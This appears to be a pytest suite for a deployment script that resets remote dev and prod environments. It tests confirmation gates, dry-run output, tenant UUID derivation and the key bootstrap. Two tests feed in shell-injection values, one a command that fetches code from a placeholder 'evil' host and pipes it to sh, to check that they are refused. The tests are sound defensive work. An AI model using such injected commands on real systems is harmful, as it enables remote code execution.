from __future__ import annotations

import os
import subprocess
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[1]
SCRIPT = REPO_ROOT / "scripts" / "deploy" / "recognition-service.sh"


def _run(
    args: list[str], env_overrides: dict[str, str] | None = None
) -> subprocess.CompletedProcess[str]:
    env = {**os.environ}
    # Strip prod confirmation + remote-build flag so tests start from a clean slate.
    env.pop("CONFIRM", None)
    env.pop("CONFIRM_REMOTE_RESET", None)
    env.pop("ACX_RESET_DRY_RUN", None)
    env.pop("REMOTE_BUILD", None)
    env.pop("ACX_REMOTE_BUILD", None)
    if env_overrides:
        env.update(env_overrides)
    return subprocess.run(
        ["/bin/bash", str(SCRIPT), *args],
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )


def test_reset_without_env_fails_with_usage() -> None:
    result = _run(["reset"])
    assert result.returncode != 0
    assert (
        "reset requires <env>" in result.stderr
        or "reset requires <env>" in result.stdout
    )


def test_reset_with_unknown_env_fails() -> None:
    result = _run(["reset", "bogus"])
    assert result.returncode != 0
    combined = result.stdout + result.stderr
    assert "Unknown env" in combined


def test_reset_dev_without_confirmation_fails_and_names_lever() -> None:
    result = _run(["reset", "dev"])
    assert result.returncode != 0
    combined = result.stdout + result.stderr
    assert "CONFIRM_REMOTE_RESET=RESET" in combined


def test_reset_prod_with_reset_confirm_but_no_promote_confirm_fails() -> None:
    result = _run(
        ["reset", "prod"],
        env_overrides={"CONFIRM_REMOTE_RESET": "RESET"},
    )
    assert result.returncode != 0
    combined = result.stdout + result.stderr
    assert "CONFIRM=PROMOTE" in combined


def test_reset_dev_dry_run_with_confirmation_succeeds_and_summarizes_plan() -> None:
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout
    assert "DRY-RUN" in out or "dry-run" in out
    assert "acx-dev" in out
    assert "/opt/acx-backend/dev" in out
    assert "https://dev.api.altcontext.com/ready" in out


def test_reset_dev_fir_dry_run_with_confirmation_succeeds_and_summarizes_plan() -> None:
    """FIR23-STACK: reset accepts dev-fir and maps unit/dir/ready URLs."""
    result = _run(
        ["reset", "dev-fir"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout
    assert "DRY-RUN" in out or "dry-run" in out
    assert "acx-dev-fir" in out
    assert "/opt/acx-backend/dev-fir" in out
    assert "https://fir.dev.api.altcontext.com/ready" in out


def test_reset_prod_dry_run_with_both_confirmations_succeeds() -> None:
    result = _run(
        ["reset", "prod"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "CONFIRM": "PROMOTE",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout
    assert "acx-prod" in out
    assert "https://api.altcontext.com/ready" in out


def test_reset_dev_dry_run_prints_canonical_remote_command_sequence() -> None:
    """The dry-run must print the exact remote shell sequence the operator can audit
    before allowing the destructive run. This is the verification surface for slice 2c
    since we cannot exercise the actual SSH path from CI."""
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout
    # SSH target named (default OCI host or override echoed back)
    assert "ssh " in out or "SSH target" in out
    # Stop, clear, and start verbs visible in the remote command shape
    assert "systemctl stop acx-dev" in out
    assert "docker compose" in out and "down" in out
    assert "systemctl start acx-dev" in out
    # PGDATA reset boundary named explicitly
    assert "ACX_PGDATA_PATH" in out
    # Working directory for the remote compose project
    assert "/opt/acx-backend/dev" in out


def test_reset_dev_dry_run_includes_ready_verification_and_bootstrap_steps() -> None:
    """Slice 2d: dry-run must surface the post-reset bootstrap command and the
    /ready verification curl so the operator can audit both before a real run."""
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout
    # /ready verification curl, not just /health
    assert "curl" in out
    assert "https://dev.api.altcontext.com/ready" in out
    # Bootstrap step references the canonical credential-recreation entry point.
    assert "manage_api_keys" in out
    assert "create" in out


def test_reset_dev_dry_run_bootstrap_uses_canonical_cli_contract() -> None:
    """Slice 3 / E15-12-BR-03: the bootstrap shape must match the real
    manage_api_keys.py CLI contract.

    The earlier slice-2d implementation used flags that do not exist
    (--tenant-id, --name) and omitted the mandatory top-level --env, which
    would make the destructive reset path unrecoverable: postgres wiped, then
    the bootstrap exits with argparse usage error and the operator is left
    without a service-mode key.

    Real contract (apps/prototype-description-service/scripts/manage_api_keys.py):
        python -m scripts.manage_api_keys --env {prod,dev,local} \
            tenant create --tenant <uuid> --site-url <url>
        python -m scripts.manage_api_keys --env {prod,dev,local} \
            create --tenant <uuid>
    """
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout

    # Mandatory top-level env flag with a valid choice.
    assert "--env prod" in out or "--env dev" in out or "--env local" in out, (
        "bootstrap is missing the mandatory --env flag from manage_api_keys CLI"
    )

    # Tenant bootstrap (idempotent) before key creation.
    assert "tenant create" in out, (
        "bootstrap must run `tenant create` before `create` so the FK exists"
    )
    assert "--site-url" in out, "tenant create requires --site-url per the CLI contract"

    # Key creation uses --tenant <uuid>, NOT --tenant-id, and there is no --name.
    assert "--tenant " in out, "create must use --tenant <uuid>, not --tenant-id"
    assert "--tenant-id" not in out, (
        "the CLI has no --tenant-id flag; use --tenant <uuid>"
    )
    assert "--name " not in out, (
        "the CLI has no --name flag; remove it from the bootstrap command"
    )

    # The OCI postgres lives inside the compose project on the remote VM. The
    # bootstrap must run there (via docker compose exec or equivalent), not
    # locally, because the local DSN points at the operator's laptop DB.
    assert "docker compose" in out and "exec" in out, (
        "bootstrap must run inside the api container on the remote VM "
        "(the local DSN is not the OCI db that was just reset)"
    )


def test_reset_dev_dry_run_bootstrap_redirects_exec_stdin() -> None:
    """E15-12-BR-05: each `docker compose exec -T` line in the bootstrap
    must redirect its stdin from /dev/null.

    The bootstrap is delivered to the remote shell via
    `ssh ... bash -s <<<"${bootstrap_cmd}"`. Without `< /dev/null` on each
    `exec -T` invocation, the first exec call reads from bash's stdin and
    consumes the remaining bootstrap lines, so the second exec — the one
    that prints the `api_key=` line — silently never runs.

    This was caught against a real `make reset-remote ENV=dev` on
    2026-05-02: tenant create succeeded, key create did not, and the
    operator was left with no way to authenticate the plugin against the
    freshly reset env.
    """
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout

    exec_lines = [
        line
        for line in out.splitlines()
        if "docker compose" in line and "exec -T" in line
    ]
    assert len(exec_lines) >= 2, (
        f"expected at least two `docker compose exec -T` lines (tenant + "
        f"key create); got {len(exec_lines)}: {exec_lines!r}"
    )
    for line in exec_lines:
        assert "< /dev/null" in line, (
            "bootstrap exec line must redirect stdin from /dev/null so the "
            "first exec does not swallow the remaining bootstrap heredoc "
            f"lines (E15-12-BR-05); offender: {line!r}"
        )


def _derive_tenant_id_from_site_url(site_url: str) -> str:
    """Mirror of TenantIdentity::derive_from_site_url() for assertion purposes.

    The PHP implementation lives at
    apps/prototype-wp-alt-context/src/api/class-tenant-identity.php. The
    bootstrap must produce the same value or the plugin's per-request
    X-Tenant-ID will not match the tenant the bootstrap key is bound to,
    and the backend rejects with HTTP 403 'tenant mismatch' (E15-12-BR-06).
    """
    import hashlib

    normalized = site_url.lower().rstrip("/")
    h = hashlib.sha1(f"acx-site-tenant:{normalized}".encode()).hexdigest()
    time_hi = (int(h[12:16], 16) & 0x0FFF) | 0x5000
    clock_seq = (int(h[16:20], 16) & 0x3FFF) | 0x8000
    return f"{h[0:8]}-{h[8:12]}-{time_hi:04x}-{clock_seq:04x}-{h[20:32]}"


def test_reset_dev_dry_run_br06_requires_explicit_site_url() -> None:
    """E15-12-BR-06: the bootstrap must not silently default site_url to the
    recognition API URL.

    The plugin sends X-Tenant-ID = TenantIdentity::derive_from_site_url() on
    every request, where site_url is the WordPress site URL — not the
    recognition API URL. If the bootstrap creates a key for a tenant derived
    from the API URL (or a hard-coded default UUID), the backend rejects the
    plugin's first authenticated request with HTTP 403 'tenant mismatch'.

    The reset path must require ACX_RESET_SITE_URL to be the WordPress site
    URL the plugin will hit, and fail closed when it is missing.
    """
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
        },
    )
    assert result.returncode != 0, (
        "reset must fail closed without ACX_RESET_SITE_URL; got rc=0 with "
        f"stdout={result.stdout!r} stderr={result.stderr!r}"
    )
    combined = result.stdout + result.stderr
    assert "ACX_RESET_SITE_URL" in combined, (
        "error message must name the ACX_RESET_SITE_URL lever the operator "
        f"needs to set; got: {combined!r}"
    )


def test_reset_dev_dry_run_br06_derives_tenant_id_from_site_url() -> None:
    """E15-12-BR-06: when ACX_RESET_SITE_URL is supplied without an explicit
    ACX_RESET_TENANT_ID, the bootstrap derives the tenant UUID from the site
    URL using the same algorithm as TenantIdentity::derive_from_site_url() in
    the WordPress plugin. This is what makes the bootstrap key actually usable
    by the plugin's first authenticated request post-reset.
    """
    site_url = "http://localhost:10010"
    expected_uuid = _derive_tenant_id_from_site_url(site_url)
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": site_url,
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout
    assert expected_uuid in out, (
        f"bootstrap must use derived tenant UUID {expected_uuid} for "
        f"site_url={site_url}; got: {out!r}"
    )
    # The legacy hard-coded default UUID must not appear when derivation is
    # in effect — that was the BR-06 bug.
    assert "00000000-0000-7000-8000-000000000000" not in out, (
        "bootstrap leaked the legacy hard-coded default tenant UUID; the "
        "derivation path must replace it entirely"
    )
    # The site_url passed to `tenant create --site-url` must be the WordPress
    # site URL (the one the plugin sends as Origin/host context), not the
    # recognition API URL.
    assert f"--site-url {site_url}" in out, (
        f"tenant create must use --site-url={site_url}; got: {out!r}"
    )


def test_reset_dev_dry_run_br06_explicit_tenant_id_overrides_derivation() -> None:
    """E15-12-BR-06: if both ACX_RESET_TENANT_ID and ACX_RESET_SITE_URL are
    supplied, the explicit UUID wins (escape hatch for non-derived tenants
    such as a custom multi-site arrangement). Site URL is still required for
    `tenant create --site-url`.
    """
    site_url = "http://localhost:10010"
    explicit_uuid = "11111111-2222-7333-9444-555555555555"
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": site_url,
            "ACX_RESET_TENANT_ID": explicit_uuid,
        },
    )
    assert result.returncode == 0, result.stderr
    out = result.stdout
    assert explicit_uuid in out, (
        f"explicit ACX_RESET_TENANT_ID={explicit_uuid} must override "
        f"derivation; got: {out!r}"
    )
    derived = _derive_tenant_id_from_site_url(site_url)
    assert derived not in out, (
        f"derived UUID {derived} must not appear when explicit "
        f"ACX_RESET_TENANT_ID is set; got: {out!r}"
    )


def test_reset_dev_dry_run_does_not_open_ssh_connection() -> None:
    """The dry-run path must not actually invoke ssh — it announces what it would
    do and exits 0 cleanly."""
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
            # If any code path tried to ssh, this fake host would fail loudly.
            "OCI_HOST": "definitely-not-a-real-host.invalid",
            "OCI_USER": "nobody",
        },
    )
    assert result.returncode == 0, result.stderr
    combined = result.stdout + result.stderr
    # No connection attempts surfaced.
    assert "Connection" not in combined
    assert "Could not resolve" not in combined
    # And the dry-run still echoes the configured target so operators can review it.
    assert "definitely-not-a-real-host.invalid" in combined


def test_reset_refuses_shell_injection_in_site_url() -> None:
    """S2-A-02 / TEST-15: ACX_RESET_SITE_URL metacharacters fail closed before ssh.

    Executes the real reset path (dry-run still validates). Reviewer vector with
    semicolon / pipe must never reach a remote bash -s command string.
    """
    evil = "http://localhost:10010; curl http://evil/x | sh; #"
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": evil,
        },
    )
    assert result.returncode != 0, (
        f"evil ACX_RESET_SITE_URL must be refused; stdout={result.stdout!r} "
        f"stderr={result.stderr!r}"
    )
    combined = result.stdout + result.stderr
    assert "ACX_RESET_SITE_URL" in combined or "charset" in combined.lower()


def test_reset_refuses_shell_injection_in_tenant_id() -> None:
    """S2-A-02 / TEST-15: ACX_RESET_TENANT_ID metacharacters fail closed."""
    evil = "11111111-2222-7333-9444-555555555555; id"
    result = _run(
        ["reset", "dev"],
        env_overrides={
            "CONFIRM_REMOTE_RESET": "RESET",
            "ACX_RESET_DRY_RUN": "1",
            "ACX_RESET_SITE_URL": "http://localhost:10010",
            "ACX_RESET_TENANT_ID": evil,
        },
    )
    assert result.returncode != 0, (
        f"evil ACX_RESET_TENANT_ID must be refused; stdout={result.stdout!r} "
        f"stderr={result.stderr!r}"
    )
    combined = result.stdout + result.stderr
    assert "ACX_RESET_TENANT_ID" in combined or "charset" in combined.lower()


def test_reset_live_bootstrap_passes_tenant_site_as_positional_args(
    tmp_path: Path,
) -> None:
    """S2-A-02: live bootstrap uses bash -s -- positional args, not string interp.

    PATH-stubbed ssh captures argv. verify curl is stubbed so readiness passes.
    """
    bindir = tmp_path / "bin"
    bindir.mkdir()
    ssh_log = tmp_path / "ssh.log"
    ssh_log.write_text("")
    (bindir / "ssh").write_text(
        "#!/bin/sh\n"
        f'{{ printf "ARGV:"; for a in "$@"; do printf " <%s>" "$a"; done; printf "\\n"; }} >> "{ssh_log}"\n'
        "# Drain heredoc stdin so bash -s callers do not hang.\n"
        "cat >/dev/null 2>&1 || true\n"
        "exit 0\n"
    )
    (bindir / "ssh").chmod(0o755)
    (bindir / "curl").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "curl").chmod(0o755)
    (bindir / "sleep").write_text("#!/bin/sh\nexit 0\n")
    (bindir / "sleep").chmod(0o755)

    site_url = "http://localhost:10010"
    tenant_id = "11111111-2222-7333-9444-555555555555"
    env = {**os.environ}
    env.pop("CONFIRM", None)
    env.pop("CONFIRM_REMOTE_RESET", None)
    env.pop("ACX_RESET_DRY_RUN", None)
    env["PATH"] = f"{bindir}:{env['PATH']}"
    env["CONFIRM_REMOTE_RESET"] = "RESET"
    env["ACX_RESET_SITE_URL"] = site_url
    env["ACX_RESET_TENANT_ID"] = tenant_id
    # Skip preflight that would try real network beyond our stubs.
    script = (
        f'source "{SCRIPT}"; '
        f"preflight_ssh() {{ :; }}; "
        f'do_reset dev'
    )
    proc = subprocess.run(
        ["/bin/bash", "-c", script],
        capture_output=True,
        text=True,
        env=env,
        check=False,
        timeout=30,
    )
    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
    log = ssh_log.read_text()
    # Bootstrap call must pass tenant/site as separate argv after bash -s, not
    # embedded unquoted inside a single remote command string with shell metachars.
    assert tenant_id in log, log
    assert site_url in log, log
    # Live verify must not use shell-eval; array expansion only.
    assert 'until eval "' not in SCRIPT.read_text()
    assert 'until "${verify_cmd[@]}"' in SCRIPT.read_text()
    # Bootstrap argv: tenant_id must appear as its own ssh argv word (positional), not
    # only buried inside a single remote script string.
    assert f"<{tenant_id}>" in log, log
    assert f"<{site_url}>" in log, log
    assert "bash -s --" in log or "bash" in log
